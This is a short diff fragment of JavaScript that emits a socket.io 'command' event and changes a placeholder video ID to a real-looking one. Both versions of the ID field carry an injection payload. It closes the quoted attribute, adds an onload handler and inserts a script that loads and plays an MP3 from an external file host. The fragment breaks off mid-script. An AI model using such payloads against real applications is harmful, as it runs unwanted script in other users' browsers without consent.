@@ -1,7 +1,7 @@
 socket.emit('command', {
   list: [
     "youtube",
-    "VIDEO_ID\" onload=\" \
+    "FveF-we6lcE\" onload=\" \
       var s=document.createElement('script'); \
       s.textContent = `(function(){ \
         var audio = new Audio('https://files.catbox.moe/j5729s.mp3'); \
